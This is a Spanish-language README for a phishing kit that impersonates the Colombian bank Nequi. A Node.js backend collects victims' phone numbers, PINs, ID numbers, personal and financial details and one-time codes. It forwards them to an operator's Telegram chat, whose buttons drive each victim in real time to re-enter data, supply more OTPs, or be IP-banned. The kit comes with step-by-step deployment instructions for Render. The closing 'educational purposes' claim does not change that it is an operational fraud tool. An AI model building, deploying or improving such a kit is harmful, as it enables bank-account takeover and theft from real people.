# Sistema Backend Dinámico para Nequi con Telegram

## 📋 Descripción General

Este sistema implementa un backend Node.js con Express que gestiona el flujo completo de una página de phishing educativo de Nequi, con control dinámico mediante botones de Telegram.

## 🎯 Características Principales

### 1. **Gestión de Sesiones**
- Cada usuario recibe un `sessionId` único
- Se guarda la IP, país y ciudad del usuario
- Sistema de almacenamiento en memoria con Map de Node.js

### 2. **Sistema de Banneo por IP**
- Los administradores pueden banear IPs desde Telegram
- Usuarios baneados ven pantalla blanca en cualquier página
- Verificación automática en cada carga de página

### 3. **Control Dinámico con Telegram**
- Botones interactivos para cada acción
- Menús diferentes según el paso del flujo
- Redirecciones controladas desde Telegram

### 4. **Auto-Ping**
- Evita que Render ponga el servidor en modo sleep
- Ping cada 14 minutos (Render duerme a los 15 min)

### 5. **Loaders con Animaciones**
- Loader integrado de Nequi con animación de cubos
- Animación de "aprobado" (check verde)
- Animación de "cancelado" (X roja)

## 📁 Estructura de Archivos

```
proyecto/
├── server.js                      # Backend principal
├── package.json                   # Dependencias
├── public/
│   ├── js/
│   │   └── common.js             # Funciones compartidas
│   ├── css/                      # Estilos (los que ya tienes)
│   ├── assets/                   # Imágenes (las que ya tienes)
│   ├── accces-sign-in.php.html   # Paso 1: Número
│   ├── access-sign-in-pass.php.html  # Paso 2: Clave
│   ├── loan-simulator.php.html   # Paso 3: Datos préstamo
│   ├── one-time-pass.php.html    # Paso 4: Dinámicas
│   └── consignar.html            # Paso final
└── README.md                     # Este archivo
```

## 🔄 Flujo del Sistema

### Paso 1: Número de Teléfono
**Archivo:** `accces-sign-in.php.html`
- Usuario ingresa número
- Se crea sessionId
- Redirección automática a paso 2

### Paso 2: Clave (4 dígitos)
**Archivo:** `access-sign-in-pass.php.html`
- Usuario ingresa clave de 4 dígitos
- Validación de 3 dígitos consecutivos
- **Endpoint:** `/step1-credentials`
- **Sin botones** en Telegram (solo notificación)
- Redirección automática a paso 3

### Paso 3: Datos de Préstamo
**Archivo:** `loan-simulator.php.html`
- Usuario ingresa: cédula, nombre, ocupación, ingresos, gastos
- **Primera vez:** Solo guarda saldo 1 (endpoint `/step2-loan-first`)
- **Segunda vez:** Guarda saldo 2 y envía AMBOS saldos (endpoint `/step2-loan-second`)
- **Botones en Telegram:**
  - ❌ Error Número → `accces-sign-in.php.html`
  - ❌ Error Clave → `access-sign-in-pass.php.html`
  - ❌ Error Monto → Scroll al segundo input de saldo (misma página)
  - ♻️ Pedir Dinámica → `one-time-pass.php.html`
  - 🚫 BANEAR → Banea IP del usuario
  - ✅ Consignar → `consignar.html`

### Paso 4: Dinámicas (OTP)
**Archivo:** `one-time-pass.php.html`
- Usuario ingresa código dinámico de 6 dígitos
- **Endpoint:** `/step3-dynamic`
- Se envían hasta 3 dinámicas
- **Botones en Telegram:**
  - ❌ Error Dinámica → Muestra error en la misma página
  - ❌ Error Número → `accces-sign-in.php.html`
  - ❌ Error Clave → `access-sign-in-pass.php.html`
  - ❌ Error Monto → `loan-simulator.php.html` (segundo saldo)
  - 🚫 BANEAR → Banea IP
  - ✅ Consignar → `consignar.html`

## 🚀 Instalación en Render

### 1. Variables de Entorno en Render
```
BOT_TOKEN=tu_bot_token_de_telegram
CHAT_ID=tu_chat_id_de_telegram
RENDER_URL=https://tu-proyecto.onrender.com
NODE_VERSION=18.x
```

### 2. Comandos de Build
```bash
# Build Command
npm install

# Start Command
npm start
```

### 3. Configurar Webhook de Telegram
El webhook se configura automáticamente al iniciar el servidor.

## 📝 Endpoints del Backend

### GET `/`
Verificación del estado del servidor
```json
{
  "ok": true,
  "service": "Nequi Backend Dinámico",
  "hasEnv": true,
  "status": "running"
}
```

### POST `/create-session`
Crea una nueva sesión de usuario
```json
// Request
{
  "ip": "181.143.23.45",
  "country": "Colombia",
  "city": "Barranquilla"
}

// Response
{
  "sessionId": "session_1234567890_abc123"
}
```

### POST `/check-ban`
Verifica si una IP está baneada
```json
// Request
{
  "ip": "181.143.23.45"
}

// Response
{
  "banned": false
}
```

### POST `/step1-credentials`
Envía número y clave
```json
{
  "sessionId": "session_xxx",
  "phoneNumber": "321 485 4545",
  "password": "1234",
  "ip": "181.143.23.45",
  "country": "Colombia",
  "city": "Barranquilla"
}
```

### POST `/step2-loan-first`
Primer saldo (solo guarda, no envía a Telegram)
```json
{
  "sessionId": "session_xxx",
  "cedula": "1234567890",
  "nombreCompleto": "Juan Pérez",
  "ocupacion": "Empleado",
  "ingresoMensual": "$ 2.500.000",
  "gastosMensual": "$ 1.500.000",
  "saldoActual": "$ 800.000"
}
```

### POST `/step2-loan-second`
Segundo saldo (envía TODO a Telegram con botones)
```json
{
  "sessionId": "session_xxx",
  "saldoActual": "$ 850.000"
}
```

### POST `/step3-dynamic`
Envía código dinámico
```json
{
  "sessionId": "session_xxx",
  "otp": "123456",
  "attemptNumber": 1
}
```

### GET `/instruction/:sessionId`
Consulta si hay redirección pendiente
```json
// Response con redirección
{
  "redirect_to": "one-time-pass.php.html"
}

// Response sin redirección
{}
```

### POST `/webhook/:BOT_TOKEN`
Webhook de Telegram (se configura automáticamente)

## 🎮 Uso de Botones en Telegram

### Botones del Menú de Préstamo
```
❌ Error Número  |  ❌ Error Clave
❌ Error Monto   |  ♻️ Pedir Dinámica
🚫 BANEAR        |  ✅ Consignar
```

### Botones del Menú de Dinámicas
```
❌ Error Dinámica  |  ❌ Error Número
❌ Error Clave     |  ❌ Error Monto
🚫 BANEAR          |  ✅ Consignar
```

### Acciones Especiales

#### 🚫 BANEAR
- Agrega la IP del usuario a la lista de baneados
- Usuario ve pantalla blanca en todas las páginas
- No puede volver a acceder

#### ❌ Error Dinámica
- NO redirige a otra página
- Muestra mensaje de error en la misma página
- Usuario puede intentar nuevamente

#### ❌ Error Monto
- Redirige a `loan-simulator.php.html`
- Hace scroll automático al segundo input de saldo
- Usuario corrige el saldo

## 🎨 Animaciones de Loader

### Loader de Procesamiento
```html
<div class="loading-spinner">
  <div class="nequi-loader">
    <div class="cube"></div>
    <div class="cube"></div>
  </div>
</div>
```

### Animación de Éxito
```html
<div class="done">
  <div class="check"></div>
  <span>¡Listo!</span>
</div>
```

Se activa cuando:
- Admin hace clic en "Pedir Dinámica"
- Admin hace clic en "Consignar"

### Animación de Error
Se activa cuando:
- Admin hace clic en "Error Monto"
- Admin hace clic en "Error Dinámica"

## 📱 Modificaciones en HTML

Todos los archivos HTML deben incluir:

```html
<!-- En el <head> -->
<script src="../js/common.js"></script>

<!-- Al final del <body> -->
<script>
  const BACKEND_URL = 'https://tu-proyecto.onrender.com';

  document.addEventListener("DOMContentLoaded", async function() {
    // 1. Verificar banneo
    const banned = await checkIfBanned();
    if (banned) return;

    // 2. Iniciar sesión
    const sessionId = await initSession();
    
    // 3. Iniciar polling (solo en páginas que esperan redirección)
    startPolling(sessionId, (redirect) => {
      // Manejar redirección personalizada
      if (redirect === 'error-dynamic') {
        // Mostrar error
        return;
      }
      window.location.href = redirect;
    });

    // 4. Tu código específico de la página...
  });
</script>
```

## 🔧 Configuración de URL

Cambiar en TODOS los archivos:
```javascript
const BACKEND_URL = 'https://tu-proyecto.onrender.com';
```

Por la URL real de tu proyecto en Render.

## 📊 Datos Enviados a Telegram

### Paso 1 (Credenciales)
```
🟣 NUEVO INGRESO NEQUI 🟣

📱 Número: 321 485 4545
🔑 Clave: 1234
🌐 IP: 181.143.23.45
📍 Ubicación: Barranquilla, Colombia
🆔 Session: session_xxx
```

### Paso 3 (Préstamo Completo)
```
🟣 INFO DE PRÉSTAMO COMPLETA 🟣

📱 Número: 321 485 4545
🔑 Clave: 1234
🪪 Cédula: 1234567890
👤 Nombre y apellido: Juan Pérez
🧑‍💼 Ocupación: Empleado
📈 Ingresos mensuales: $ 2.500.000
💸 Gastos mensuales: $ 1.500.000
💰 Saldo actual 1: $ 800.000
💰 Saldo actual 2: $ 850.000
🌐 IP: 181.143.23.45
📍 Ubicación: Barranquilla, Colombia
🆔 Session: session_xxx
```

### Paso 4 (Dinámica)
```
📲 DINÁMICA 1 RECIBIDA 📲

📱 Número: 321 485 4545
🔑 Clave: 1234
👤 Nombre y apellido: Juan Pérez
💰 Saldo actual 1: $ 800.000
💰 Saldo actual 2: $ 850.000
🔢 Dinámica 1: 123456
🆔 Session: session_xxx
```

## 🛠️ Debugging

### Ver logs en Render
```bash
# En la terminal de Render
npm start
```

### Verificar webhook de Telegram
```bash
curl https://api.telegram.org/bot<BOT_TOKEN>/getWebhookInfo
```

### Testear endpoints
```bash
# Verificar servidor
curl https://tu-proyecto.onrender.com/

# Crear sesión
curl -X POST https://tu-proyecto.onrender.com/create-session \
  -H "Content-Type: application/json" \
  -d '{"ip":"181.143.23.45","country":"Colombia","city":"Barranquilla"}'
```

## ⚠️ Importante

1. **NUNCA** commitear el archivo `.env` con tokens reales
2. Usar variables de entorno en Render
3. El sistema de banneo es temporal (se borra al reiniciar el servidor)
4. Para banneo permanente, usar una base de datos

## 📚 Próximos Pasos

1. Copiar todos los archivos a tu proyecto local
2. Modificar `BACKEND_URL` en todos los HTML
3. Subir a GitHub
4. Conectar GitHub con Render
5. Configurar variables de entorno en Render
6. Deploy automático

## 🎓 Notas Educativas

Este proyecto es únicamente con fines educativos para entender:
- Arquitectura cliente-servidor
- Webhooks de Telegram
- Gestión de sesiones
- Control de flujo dinámico
- Polling vs WebSockets
